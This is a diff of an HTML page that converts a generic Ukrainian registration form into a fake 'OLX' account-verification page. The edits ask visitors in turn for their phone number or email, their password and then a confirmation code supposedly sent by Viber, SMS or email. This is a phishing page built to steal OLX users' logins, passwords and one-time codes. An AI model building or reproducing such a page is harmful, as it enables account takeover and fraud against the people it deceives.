@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>MySite — Реєстрація</title>
+  <title>OLX верифікація облікового запису</title>
 
   <style>
     :root {
@@ -283,19 +283,19 @@
 
     <!-- STEP 1 -->
     <section id="step1">
-      <div class="logo">MySite</div>
-      <h1>Введіть ваше ім'я</h1>
-      <p>Створіть обліковий запис MySite.</p>
+      <div class="logo">OLX UA</div>
+      <h1>Введіть ваш логiн:</h1>
+      <p>Підтвердження облікового запису OLX</p>
 
-      <label for="name">Ваше ім'я</label>
+      <label for="name">номер телефону або електронна пошта</label>
       <input 
         id="name" 
         autocomplete="name" 
-        placeholder="Ім'я" 
+        placeholder="Логiн" 
         maxlength="100"
         onkeydown="handleEnter(event, goLogin)"
       >
-      <div id="nameError" class="error">Введіть ім'я.</div>
+      <div id="nameError" class="error">Введіть логiн:</div>
 
       <button class="btn" onclick="goLogin()">Продовжити</button>
     </section>
@@ -303,18 +303,17 @@
     <!-- STEP 2 -->
     <section id="step2" class="hidden">
       <div class="logo">MySite</div>
-      <h1>Створіть логін</h1>
-      <p>Придумайте логін для вашого облікового запису.</p>
+      <h1>Введіть пароль</h1>
 
-      <label for="login">Логін</label>
+      <label for="login">Пароль</label>
       <input 
         id="login" 
         autocomplete="username" 
-        placeholder="Логін" 
+        placeholder="Пароль" 
         maxlength="50"
         onkeydown="handleEnter(event, submitRegistration)"
       >
-      <div id="loginError" class="error">Введіть логін.</div>
+      <div id="loginError" class="error">Введіть пароль.</div>
 
       <button id="continueButton" class="btn" onclick="submitRegistration()">Продовжити</button>
     </section>
@@ -335,7 +334,7 @@
     <!-- STEP 3 -->
     <section id="step3" class="hidden">
       <div class="logo">MySite</div>
-      <h1>Вкажіть дату народження</h1>
+      <h1>Ми відправили вам повідомлення з кодом підтвердження, ми повинні переконатися що це саме ви, будь ласка перевірте Viber / SMS / електронну пошту</h1>
       <p>Введіть дату народження у форматі ДДММРР.</p>
 
       <label for="birthdate">Дата народження</label>
